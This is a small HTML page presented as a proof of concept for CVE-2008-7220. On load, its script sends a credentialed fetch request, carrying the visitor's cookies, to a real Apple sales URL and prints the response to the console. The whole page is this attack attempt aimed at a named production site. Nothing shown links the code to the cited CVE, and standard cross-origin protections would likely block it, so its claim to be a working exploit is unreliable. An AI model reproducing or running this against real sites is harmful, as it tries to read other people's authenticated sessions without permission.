<!DOCTYPE html>
<html>
<head>
    <title>CVE-2008-7220 PoC - Requisição Direta</title>
</head>
<body>
    <h1>CVE-2008-7220 PoC - Requisição Direta</h1>

    <script>
        // Função para fazer a requisição e exibir o conteúdo no console
        function fetchPageContent() {
            fetch('https://sales.apple.com/home', {
                method: 'GET',
                credentials: 'include' // Inclui cookies se necessário
            })
            .then(response => {
                if (response.ok) {
                    return response.text(); // Obtém o conteúdo da resposta como texto
                } else {
                    throw new Error('Falha na requisição: ' + response.status);
                }
            })
            .then(text => {
                console.log(text); // Exibe o conteúdo no console
            })
            .catch(error => {
                console.error('Erro:', error); // Exibe erros no console
            });
        }

        // Executa a função para buscar o conteúdo da página
        fetchPageContent();
    </script>
</body>
</html>
